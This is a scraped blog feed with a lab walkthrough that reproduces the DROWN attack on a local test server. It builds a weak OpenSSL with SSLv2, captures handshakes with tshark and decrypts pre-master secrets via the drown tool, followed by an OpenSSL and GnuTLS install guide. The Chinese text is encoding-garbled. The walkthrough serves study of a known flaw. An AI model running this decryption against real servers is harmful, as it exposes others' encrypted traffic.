      <title>Fuckopenssl 1.0.1l</title>
      <link href="/posts/2dc41376/"/>
      <url>/posts/2dc41376/</url>
      
        <content type="html"><![CDATA[<h1>fuckopenssl 1.0.1l</h1><p>[TOC]</p><blockquote><p>2021-08-10  14:19:38</p><p>@Auther by : sizaif</p></blockquote><h2 id="å®‰è£…-openssl-1-0-1l">å®‰è£… openssl 1.0.1l</h2><div class="story post-story"><p>ä¸æ•´å¹ºè›¾å­, å°±é»˜è®¤å®‰è£…ä½ç½®</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://www.openssl.org/source/openssl-1.0.1l.tar.gz<span class="token function">tar</span> xzf openssl-1.0.1l.tar.gz<span class="token builtin class-name">cd</span> openssl-1.0.1l./config enable-ssl2 enable-weak-ciphers<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment"># é»˜è®¤å®‰è£…ä½ç½®åœ¨ /usr/local/ssl</span></code></pre>              </div>            </details><p><strong>æ›´æ”¹ç‰ˆæœ¬ä¿¡æ¯</strong></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å°†æ—§ç‰ˆæœ¬çš„opensslè¿›è¡Œå¤‡ä»½</span><span class="token comment"># å¦‚æœå·²ç»æ˜¯root äº† å°±ä¸ç”¨sudo </span><span class="token function">sudo</span> <span class="token function">mv</span> /usr/bin/openssl /usr/bin/openssl.old    <span class="token comment"># å°†æ–°ç‰ˆæœ¬çš„opensslè¿›è¡Œè½¯é“¾æ¥</span><span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/local/ssl/bin/openssl /usr/bin/openssl    <span class="token comment">#è¿›å…¥etcç›®å½•</span><span class="token builtin class-name">cd</span> /etc/   <span class="token comment">#ä¸‹ä¸€æ­¥ä¸€å®šè¦åˆ‡æ¢åˆ°rootç”¨æˆ·</span><span class="token comment"># å¦‚æœå·²ç»æ˜¯root ç”¨æˆ·, ç›´æ¥æ‰§è¡Œ  echo "/usr/local/lib" >> ld.so.conf  </span><span class="token function">su</span>     <span class="token comment">#å°†opensslçš„å®‰è£…è·¯å¾„åŠ å…¥é…ç½®ä¸­</span><span class="token builtin class-name">echo</span> <span class="token string">"/usr/local/lib"</span> <span class="token operator">>></span> ld.so.conf    <span class="token comment"># é‡æ–°åŠ è½½é…ç½®</span>ldconfig  </code></pre>              </div>            </details><p><strong>ç»“æœå¦‚å›¾:</strong></p><details blue><summary> å›¾ç‰‡ </summary>              <div class='content'>              <p><img src="https://gitee.com/sizaif/images/raw/master/img/20210503165412.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210503165412.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210503165410860"></p>              </div>            </details><p><strong>ç¼–è¯‘drown</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Tim---/drown<span class="token assign-left variable">SSL_PREFIX</span><span class="token operator">=</span>/usr/local/ssl <span class="token function">make</span></code></pre><p><strong>ç»“æœå¦‚å›¾:</strong></p><details blue><summary> å›¾ç‰‡ </summary>              <div class='content'>              <p><img src="https://gitee.com/sizaif/images/raw/master/img/20210503165352.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210503165352.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210503165350673"></p>              </div>            </details><pre class="language-bash" data-language="bash"><code class="language-bash">./decrypt host:port certfile c<span class="token comment"># ./decrypt 127.0.0.1:7899 certfile c</span><span class="token comment"># </span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210503170500.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210503170500.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210503170459400"></p></div><h2 id="Passive-attack">Passive attack</h2><div class="story post-story"><details green><summary> Passive attack </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å› ä¸ºå·²ç»å°† openssl1.0.1l é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ, æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨openssl å‘½ä»¤</span><span class="token comment">#</span>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days <span class="token comment"># ç»“æœå¦‚ä¸‹:</span><span class="token comment">#########################################################################################</span>root@iZj6cg4e6vhdv5s3hpkoffZ:~/supengfei/drown/fuck<span class="token comment"># openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 123</span>Generating a <span class="token number">2048</span> bit RSA private key<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.+++<span class="token punctuation">..</span><span class="token punctuation">..</span>+++writing new private key to <span class="token string">'key.pem'</span>Enter PEM pass phrase:<span class="token comment"># è¿™é‡Œè¾“å…¥çš„æ˜¯fuckopenssl</span>Verifying - Enter PEM pass phrase:-----You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter <span class="token string">'.'</span>, the field will be left blank.-----Country Name <span class="token punctuation">(</span><span class="token number">2</span> letter code<span class="token punctuation">)</span> <span class="token punctuation">[</span>AU<span class="token punctuation">]</span>:zhState or Province Name <span class="token punctuation">(</span>full name<span class="token punctuation">)</span> <span class="token punctuation">[</span>Some-State<span class="token punctuation">]</span>:beijingLocality Name <span class="token punctuation">(</span>eg, city<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>:beijingOrganization Name <span class="token punctuation">(</span>eg, company<span class="token punctuation">)</span> <span class="token punctuation">[</span>Internet Widgits Pty Ltd<span class="token punctuation">]</span>:IBMOrganizational Unit Name <span class="token punctuation">(</span>eg, section<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>:123Common Name <span class="token punctuation">(</span>e.g. server FQDN or YOUR name<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>:rootEmail Address <span class="token punctuation">[</span><span class="token punctuation">]</span>:123456@123.com<span class="token comment">#########################################################################################</span>openssl s_server -cert cert.pem -key key.pem -accept <span class="token number">4433</span> -www<span class="token comment">#</span><span class="token comment">#########################################################################################</span>root@iZj6cg4e6vhdv5s3hpkoffZ:~/supengfei/drown/fuck<span class="token comment"># openssl s_server -cert cert.pem -key key.pem -accept 4433 -www</span>Enter pass phrase <span class="token keyword">for</span> key.pem:<span class="token comment"># è¿™é‡Œè¾“å…¥çš„æ˜¯ä¸Šé¢çš„fuckopenssl</span>Using default temp DH parametersUsing default temp ECDH parametersACCEPT<span class="token comment">#########################################################################################</span><span class="token comment"># æ‰“å¼€æ–°çª—å£</span><span class="token comment"># å®‰è£… tshark</span><span class="token function">apt-get</span> <span class="token function">install</span> tshark<span class="token comment"># </span>tshark -i lo -w handshakes.cap tcp port <span class="token number">4433</span></code></pre>              </div>            </details><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210503172019.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210503172019.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210503172017959"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ‰“å¼€æ–°çª—å£</span><span class="token comment"># openssl å·²ç»é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ, æ‰€ä»¥ç›´æ¥ä½¿ç”¨openssl å‘½ä»¤</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">1000</span><span class="token variable">)</span></span> <span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>echo <span class="token string">'GET / HTTP/1.1\r\n'</span><span class="token punctuation">;</span> <span class="token function">sleep</span> <span class="token number">0.1</span><span class="token punctuation">)</span> <span class="token operator">|</span> openssl s_client -connect <span class="token number">127.0</span>.0.1:4433 -cipher kRSA<span class="token punctuation">;</span> <span class="token keyword">done</span><span class="token comment"># å±•ç¤º</span><span class="token comment">#########################################################################################</span>New, TLSv1/SSLv3, Cipher is AES256-GCM-SHA384SSL-Session:    Protocol  <span class="token builtin class-name">:</span> TLSv1.2    Cipher    <span class="token builtin class-name">:</span> AES256-GCM-SHA384    Session-ID: 49EB9A81AD65AE80476F9F72CF4472D17CFB4E33539DAAE5734B5BD2EFD878F3    Session-ID-ctx: 01000000    Master-Key: CCCF32EBBEC91A411D63589FBFAD0B2CE8290797D2749BAF3FFD5C05A4CAB79CFE2E0DAC2939155721DF65218B9757EE    Key-Arg   <span class="token builtin class-name">:</span> None    PSK identity: None    PSK identity hint: None    SRP username: None    Start Time: <span class="token number">1620033794</span>    Timeout   <span class="token builtin class-name">:</span> <span class="token number">300</span> <span class="token punctuation">(</span>sec<span class="token punctuation">)</span>    Verify <span class="token builtin class-name">return</span> code: <span class="token number">0</span> <span class="token punctuation">(</span>ok<span class="token punctuation">)</span>--- <span class="token number">128</span> items <span class="token keyword">in</span> the session cache   <span class="token number">0</span> client connects <span class="token punctuation">(</span>SSL_connect<span class="token punctuation">(</span><span class="token punctuation">))</span>   <span class="token number">0</span> client renegotiates <span class="token punctuation">(</span>SSL_connect<span class="token punctuation">(</span><span class="token punctuation">))</span>   <span class="token number">0</span> client connects that finished<span class="token number">1000</span> server accepts <span class="token punctuation">(</span>SSL_accept<span class="token punctuation">(</span><span class="token punctuation">))</span>   <span class="token number">0</span> server renegotiates <span class="token punctuation">(</span>SSL_accept<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token number">1000</span> server accepts that finished   <span class="token number">0</span> session cache hits   <span class="token number">0</span> session cache misses   <span class="token number">0</span> session cache timeouts   <span class="token number">0</span> callback cache hits <span class="token number">872</span> cache full overflows <span class="token punctuation">(</span><span class="token number">128</span> allowed<span class="token punctuation">)</span>---no client certificate available<span class="token operator">&lt;</span>/BODY<span class="token operator">></span><span class="token operator">&lt;</span>/HTML<span class="token operator">></span>read:errno<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#########################################################################################</span><span class="token comment"># get the encrypted pre-master secrets for each session with</span>tshark -r handshakes.cap -d tcp.port<span class="token operator">==</span><span class="token number">4433</span>,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token builtin class-name">:</span></code></pre>              </div>            </details><p><strong>ç»“æœå¦‚ä¸‹:</strong></p><details blue><summary> å›¾ç‰‡ </summary>              <div class='content'>              <p><img src="https://gitee.com/sizaif/images/raw/master/img/20210503172529.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210503172529.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210503172527677"></p>              </div>            </details><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># To decrypt these handshakes, we need an OpenSSL server accepting SSLv2 connections :</span>openssl s_server -cert cert.pem -key key.pem -accept <span class="token number">4434</span> -www -ssl2<span class="token comment">#########################################################################################</span>root@iZj6cg4e6vhdv5s3hpkoffZ:~/supengfei/drown/fuck<span class="token comment"># openssl s_server -cert cert.pem -key key.pem -accept 4434 -www -ssl2</span>Enter pass phrase <span class="token keyword">for</span> key.pem:<span class="token comment"># è¿™é‡Œè¾“å…¥çš„æ˜¯ ä¸Šé¢çš„pem: fuckfuckfuck</span>Using default temp DH parametersUsing default temp ECDH parametersACCEPT<span class="token comment">#########################################################################################</span><span class="token comment"># We can now decrypt the encrypted pre-master secret</span><span class="token comment">#åœ¨drown/fuck/ç›®å½•ä¸‹æ‰§è¡Œ</span><span class="token comment">#########################################################################################</span><span class="token comment"># root@iZj6cg4e6vhdv5s3hpkoffZ:~# ll supengfei/drown/fuck/</span><span class="token comment"># total 8024</span><span class="token comment"># drwxr-xr-x 2 root root    4096 May  3 17:33 ./</span><span class="token comment"># drwxr-xr-x 4 root root    4096 May  3 17:28 ../</span><span class="token comment"># -rw-r--r-- 1 root root    1375 May  3 17:14 cert.pem</span><span class="token comment"># -rw------- 1 root root 8196592 May  3 17:23 handshakes.cap</span><span class="token comment"># -rw-r--r-- 1 root root    1834 May  3 17:14 key.pem</span><span class="token comment"># -rw-r--r-- 1 root root       0 May  3 17:33 pms.tx</span><span class="token comment"># -rw-r--r-- 1 root root       0 May  3 17:28 pms.txt</span><span class="token comment"># root@iZj6cg4e6vhdv5s3hpkoffZ:~# </span><span class="token comment">#########################################################################################</span><span class="token comment">#è¿™ä¸ªä½ç½®æ˜¯cert.perm handshakes.cap çš„ä½ç½®</span><span class="token comment"># ../decrypt æ˜¯drownç›®å½•ä¸‹ç¼–è¯‘åä¼šç”Ÿæˆä¸€ä¸ªdecryptå¯æ‰§è¡Œæ–‡ä»¶ä½ç½®</span>tshark -r handshakes.cap -d tcp.port<span class="token operator">==</span><span class="token number">4433</span>,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token builtin class-name">:</span> <span class="token operator">|</span> <span class="token punctuation">..</span>/decrypt localhost:4434 cert.pem <span class="token operator">></span> pms.txt</code></pre>              </div>            </details><p><strong>ç»“æœå±•ç¤º</strong></p><details blue><summary> å›¾ç‰‡ </summary>              <div class='content'>              <p><img src="https://gitee.com/sizaif/images/raw/master/img/20210503181801.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210503181801.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210503181800121"></p>              </div>            </details><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">RSA 830cdf70dc488c8b 0303b45e46017e9dfefd22a26b7c64648fb2d00fcf8627cb0070132e370ab57a1b595e2544b1668caf3618942c2a0e34RSA a62c4d1a5c4322e2 0303e37a220b3300e6c0d139d55a1c44c2429f11b0613d746db390beb16ad8bb0203f7494d3e7385a294e4f8a18fa5aeRSA 7215d21d1c22dfb8 0303434023187d88c73a921af635d7861ed60d66ebc4053e487ea85ab6d6b76dd373844063e8da156505dc8466310395RSA 1976fb27fbccbd36 0303c9c320f9cc92567bc488c502ffacbbef28241348e30df4b2d55fdd7f8680fb201b5f75e02b9bd1db4e8e2c2fdf84RSA 3b56f9c80a754f77 0303e8abf59f4132b1634f2b4e04bf4362c7f6dae5077dc9b6bb0c48efe0c7be47a256267688c7e28e70a28c830e6af6RSA 1686f037050931a5 03036cb5a1851a174a9f43f97be770bd22411da688197bef08154d7f91f687dc6e0090d35ce147862e8bcc5c7218398cRSA 6ce5d3fd06970d25 0303e4da20c0d6dd5e03bf97d0ee4d802cab150810df524359ab990df0a01f2d51fe6c69ebfdae99ff1b1c9042367966RSA 0e447f6c36cadd1c 030313b76ce57518d001229385f6b3ca376821692f72401a32e8b2b9a1322f523b9dc3c4808e7975e6e96c3883c3b8c4RSA 830280803c06b66a 0303c80069cbb7517d723d8476ff22077e7b33b10c67872093bc7793e01a501d56c2ea2f9d16266b32bd933d8d957f2bRSA 4ee250f545d2f1ae 0303096a212344c48bfaa3153f1d1196c81beb918d61e9497033b9bd4fb118dc474187fb0965de2eff0448c072ee46e0RSA 7b5fddbfbc5e2586 0303c7714d54a817514c086f8d4004547fb6191cbc5cd36ec7816b4ab81295278b5ba13054014413cd3abf75faa05d60RSA 6053a37a45c64592 03035126dad66420ee530e50be0cfdb6aca5cb3e6897c3a2c1cb56c39704112efd36069e450814ccd70b629dc23e26b4RSA a04a28e475029688 03036657caed02639f6b450a0c7293f4abf3ad188652bd443f2d27e6ffe53f859d1d91441aa0fcc646648557ecb910f8RSA 1d37821396fecd87 030375a2214a9b475fe93ddd424a71536a0642a07d0d093abdcc84a0e1b89d3f052719e44d1816f2698d24b67ef7cc26RSA 62a5f513fc94585b 0303a873790bf018f5d6c4e1ac4d87487a34e58471762a2dffd6d92e122ec284b7dc2206569118e0a6ebfb4c2960457dRSA 8de0c774b04a20d2 0303e8748fbea20c72709a8dc436fc631521cbd068c6beddfacd4fb224ef03da92e76af9bbf3b740908efd699a797973RSA a7575ef2b95aeeeb 03033f49c4e3b9642fddcda12c05601d69113adf7bebc4c0cb963ff898373a50a0494564c97a9e0ac3e18e1f709b68a9</code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç¬”è®° </category>
          
          <category> SSL </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
            <tag> ç¬”è®° </tag>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰è£…Openssl GNUTLS WolfSSL æ‰‹å†Œ</title>
      <link href="/posts/b924c044/"/>
      <url>/posts/b924c044/</url>
      
        <content type="html"><![CDATA[<h1>å®‰è£…Openssl GNUTLS WolfSSL æ‰‹å†Œ</h1><blockquote><p>ğŸ˜„ @Auther sizaif</p><p>ğŸ“†2021-05-18  09:19:35</p></blockquote><p>[TOC]</p><h2 id="OpenSSL">OpenSSL</h2><div class="story post-story"><p>é¡¹ç›®åœ°å€:<a href="https://www.openssl.org/">https://www.openssl.org/</a></p><h3 id="å®‰è£…ä¾èµ–åº“">å®‰è£…ä¾èµ–åº“</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å®‰è£…ssl ä¾èµ–åº“</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libssl-dev <span class="token function">make</span></code></pre><h3 id="ä¸‹è½½æºç å¹¶è¿›å…¥æ–‡ä»¶">ä¸‹è½½æºç å¹¶è¿›å…¥æ–‡ä»¶</h3><p><a href="https://www.openssl.org/source/old/1.1.1/">https://www.openssl.org/source/old/1.1.1/</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä¸‹è½½OpenSSLå¯¹åº”ç‰ˆæœ¬æºç </span>https://www.openssl.org/source/old/1.1.1/openssl-1.1.1j.tar.gz<span class="token comment"># è¿›å…¥æ–‡ä»¶å</span><span class="token builtin class-name">cd</span> openssl-XXX/</code></pre><h3 id="ç¼–è¯‘å®‰è£…">ç¼–è¯‘å®‰è£…</h3><p>ç¼–è¯‘å®‰è£…æœ‰ä¸¤ç§æ–¹å¼,</p><p>ä¸€ç§æ˜¯ç¼–è¯‘å,ä¸è¿›è¡Œå®‰è£…,å³ä¸æŠŠç¼–è¯‘åçš„æ–‡ä»¶å®‰è£…åˆ°ç³»ç»Ÿç¯å¢ƒä¸‹, è¾“å…¥<code>openssl version</code>ç‰ˆæœ¬ä¸å˜</p><p>å¦ä¸€ç§æ˜¯ç¼–è¯‘åè¿›è¡Œå®‰è£…,æ›´æ¢åˆ°ç³»ç»Ÿç¯å¢ƒä¸‹</p><p>ç¬¬ä¸€ç§,ä»…ç¼–è¯‘, ä½¿ç”¨æ—¶é€šè¿‡<code>/openssl-xxx/apps/openssl</code> ä½¿ç”¨è¿™ä¸ªç‰ˆæœ¬çš„openssl</p><p>è¿™æ ·çš„ä¼˜åŠ¿æ˜¯,å¯ä»¥å¿«é€Ÿæµ‹è¯•å¤šä¸ªopensslçš„ç‰ˆæœ¬,è€Œä¸ç”¨é‡å¤æ›´æ–°å®‰è£…</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># é…ç½®ç¯å¢ƒ prefix æ˜¯å®‰è£…ç›®å½•ï¼Œopenssldiræ˜¯é…ç½®æ–‡ä»¶ç›®å½•</span><span class="token comment"># </span><span class="token comment">#  Configure --prefix=/YOUR PATH</span>./Configure <span class="token comment"># or </span>./config<span class="token comment"># ./config  --prefix=/YOUR PATH</span><span class="token comment"># ç¼–è¯‘å®‰è£…</span><span class="token comment">#å› ä¸ºè¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦å®‰è£…,åªéœ€è¦æ‹¿åˆ°ç¼–è¯‘çš„ç»“æœå»è¿è¡Œ</span><span class="token comment"># æ‰€ä»¥ ä¸éœ€è¦make install</span><span class="token function">make</span></code></pre>              </div>            </details><p>ç¬¬äºŒç§,ç¼–è¯‘å®‰è£…, ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨<code>openssl</code> å‘½ä»¤æ¥ä½¿ç”¨æ–°å®‰è£…çš„ç‰ˆæœ¬</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ç¼–è¯‘ éœ€è¦ç­‰å¥½é•¿æ—¶é—´, ä¸å¦‚è¶è¿™ä¸ªåŠŸå¤«å–å–ä¸ªèŒ¶,ä¸Šä¸ªæ´—æ‰‹é—´</span><span class="token function">make</span><span class="token comment"># ç¼–è¯‘å®Œæˆå, è¿›è¡Œå®‰è£… , ç­‰å¾…æ—¶é—´ä¹Ÿä¸çŸ­, ä¸å¦‚å»åˆ·ä¸ªå°è§†é¢‘</span><span class="token comment"># </span><span class="token function">make</span> <span class="token function">install</span><span class="token comment"># å°†æ—§ç‰ˆæœ¬çš„opensslè¿›è¡Œå¤‡ä»½</span><span class="token function">sudo</span> <span class="token function">mv</span> /usr/bin/openssl /usr/bin/openssl.old    <span class="token comment"># å°†æ–°ç‰ˆæœ¬çš„opensslè¿›è¡Œè½¯é“¾æ¥</span><span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/local/bin/openssl /usr/bin/openssl    <span class="token comment">#è¿›å…¥etcç›®å½•</span><span class="token builtin class-name">cd</span> /etc/   <span class="token comment">#ä¸‹ä¸€æ­¥ä¸€å®šè¦åˆ‡æ¢åˆ°rootç”¨æˆ·</span><span class="token function">su</span>     <span class="token comment">#å°†opensslçš„å®‰è£…è·¯å¾„åŠ å…¥é…ç½®ä¸­</span><span class="token builtin class-name">echo</span> <span class="token string">"/usr/local/lib"</span> <span class="token operator">>></span> ld.so.conf    <span class="token comment"># é‡æ–°åŠ è½½é…ç½®</span>ldconfig  <span class="token comment"># æµ‹è¯• ç‰ˆæœ¬ å¾—åˆ°å¦‚ä¸‹ç»“æœ</span>openssl version<span class="token operator">></span>OpenSSL <span class="token number">1.1</span>.1b  <span class="token number">26</span> Feb <span class="token number">2019</span><span class="token comment"># æµ‹è¯•</span>ll /usr/local/include/ll /usr/local/lib/<span class="token comment"># å¦‚ä¸‹ç»“æœ</span><span class="token comment">#å¦‚æœéœ€è¦æ›´æ¢ç‰ˆæœ¬çš„è¯,ä¿®æ”¹è½¯é“¾æ¥çš„åç§°å³å¯ï¼Œå‚ç…§ï¼š</span><span class="token comment">#å°†æ—§ç‰ˆæœ¬è¿›è¡Œå¤‡ä»½</span><span class="token function">sudo</span> <span class="token function">mv</span> /usr/include/openssl /usr/include/openssl.old    <span class="token comment">#å°†æ–°ç‰ˆæœ¬è¿›è¡Œè½¯é“¾æ¥</span><span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/local/include/openssl /usr/include/openssl   </code></pre>              </div>            </details></div><h2 id="GnuTLS">GnuTLS</h2><div class="story post-story"><p>é¡¹ç›®åœ°å€: <a href="https://www.gnutls.org/index.html">https://www.gnutls.org/index.html</a></p><h3 id="å®‰è£…ä¾èµ–åº“-2">å®‰è£…ä¾èµ–åº“</h3><p>ç¼–è¯‘éœ€è¦ <a href="https://www.lysator.liu.se/~nisse/nettle/">libnettle</a> å’Œ<a href="https://gmplib.org/">gmplib</a></p><p>Debian/Ubuntu:</p><details green><summary> Debian/Ubuntu </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> -y dash git-core autoconf libtool gettext autopoint<span class="token function">apt-get</span> <span class="token function">install</span> -y automake autogen nettle-dev libp11-kit-dev libtspi-dev libunistring-dev<span class="token function">apt-get</span> <span class="token function">install</span> -y guile-2.0-dev libtasn1-6-dev libidn2-0-dev <span class="token function">gawk</span> gperf<span class="token function">apt-get</span> <span class="token function">install</span> -y libunbound-dev dns-root-data bison help2man gtk-doc-tools<span class="token function">apt-get</span> <span class="token function">install</span> -y texinfo texlive texlive-generic-recommended texlive-extra-utils<span class="token function">apt-get</span> <span class="token function">install</span> pkg-config</code></pre>              </div>            </details><h3 id="ç¼–è¯‘å®‰è£…-2">ç¼–è¯‘å®‰è£…</h3><p>è§£é‡Šå¦‚ä¸‹</p><blockquote><p>The GnuTLS Guile bindings are available for the Guile 3.0 and 2.2 series, as well as the legacy 2.0 and even 1.8 series.</p><p>By default they are installed under the GnuTLS installation directory, typically /usr/local/share/guile/site/). Normally Guile will not find the module there without help. You may experience something like this:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>$ guile<span class="token operator">></span>â€¦<span class="token operator">></span>scheme@<span class="token punctuation">(</span>guile-user<span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">(</span>use-modules <span class="token punctuation">(</span>gnutls<span class="token punctuation">))</span><span class="token operator">></span>ERROR: no code <span class="token keyword">for</span> module <span class="token punctuation">(</span>gnutls<span class="token punctuation">)</span></code></pre><p>There are two ways to solve this. The first is to make sure that when building GnuTLS, the Guile bindings will be installed in the same place where Guile looks. You may do this by using the <code>--with-guile-site-dir</code> parameter as follows:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>$ ./configure --with-guile-site-dir<span class="token operator">=</span>no</code></pre></blockquote><p>å‘½ä»¤å¦‚ä¸‹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># --with-guile-site-dir=no  æ„å»ºGnuTLSæ—¶ï¼ŒGuileç»‘å®šå°†å®‰è£…åœ¨ä¸Guileç›¸åŒçš„ä½ç½®, è§£é‡Šå¦‚ä¸Š</span><span class="token comment"># å› ä¸ºåªéœ€è¦æµ‹è¯•GnuTls æ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤</span><span class="token comment"># è§†å®é™…æƒ…å†µå†³å®š</span>./configure --with-guile-site-dir<span class="token operator">=</span>no --with-included-libtasn1 --with-included-unistring --without-p11-kit --disable-guile --disable-doc</code></pre><p><strong>./configureç»“æœ</strong></p><details green><summary> ./configureç»“æœ </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">configure: summary of build options:  version:              <span class="token number">3.6</span>.7 shared <span class="token number">53</span>:2:23  Host/Target system:   x86_64-pc-linux-gnu  Build system:         x86_64-pc-linux-gnu  Install prefix:       /usr/local  Compiler:             gcc  Valgrind:             no  CFlags:               -g -O2  Library types:        <span class="token assign-left variable">Shared</span><span class="token operator">=</span>yes, <span class="token assign-left variable">Static</span><span class="token operator">=</span>no  Local libopts:        <span class="token function">yes</span>  Local libtasn1:       <span class="token function">yes</span>  Local unistring:      <span class="token function">yes</span>  Use nettle-mini:      no  Documentation:        no <span class="token punctuation">(</span>manpages: no<span class="token punctuation">)</span>configure: External hardware support:  /dev/crypto:          no  Hardware accel:       x86-64  Padlock accel:        <span class="token function">yes</span>  Random gen. variant:  getrandom  PKCS<span class="token comment">#11 support:      no</span>  TPM support:          noconfigure: Optional features:<span class="token punctuation">(</span>note that included applications might not compile properly<span class="token keyword">if</span> features are disabled<span class="token punctuation">)</span>  SSL3.0 support:       no  SSL2.0 client hello:  <span class="token function">yes</span>  Allow SHA1 sign:      no  DTLS-SRTP support:    <span class="token function">yes</span>  ALPN support:         <span class="token function">yes</span>  OCSP support:         <span class="token function">yes</span>  SRP support:          <span class="token function">yes</span>  PSK support:          <span class="token function">yes</span>  DHE support:          <span class="token function">yes</span>  ECDHE support:        <span class="token function">yes</span>  GOST support:         <span class="token function">yes</span>  Anon auth support:    <span class="token function">yes</span>  Heartbeat support:    <span class="token function">yes</span>  IDNA support:         no  Non-SuiteB curves:    no  FIPS140 mode:         noconfigure: Optional libraries:  Guile wrappers:       no  C++ library:          <span class="token function">yes</span>  DANE library:         no  OpenSSL compat:       noconfigure: System files:  Trust store pkcs11:  Trust store dir:  Trust store file:     /etc/ssl/certs/ca-certificates.crt  Blacklist file:  CRL file:  Priority file:        /etc/gnutls/default-priorities  DNSSEC root key file: /etc/unbound/root.keyconfigure: WARNING:****** The DNSSEC root key <span class="token function">file</span> <span class="token keyword">in</span> /etc/unbound/root.key was not found.*** This <span class="token function">file</span> is needed <span class="token keyword">for</span> the verification of DNSSEC responses.*** Use the command: unbound-anchor -a <span class="token string">"/etc/unbound/root.key"</span>*** to generate or update it.***</code></pre>              </div>            </details><h4 id="å®‰è£…">å®‰è£…</h4><p>åŒOpenssl ä¸€æ ·, æœ‰ä¸¤ç§æ–¹å¼, ä»…<code> make</code>  å’Œ  <code> make &amp;&amp; make install</code></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ç¼–è¯‘   </span><span class="token function">make</span><span 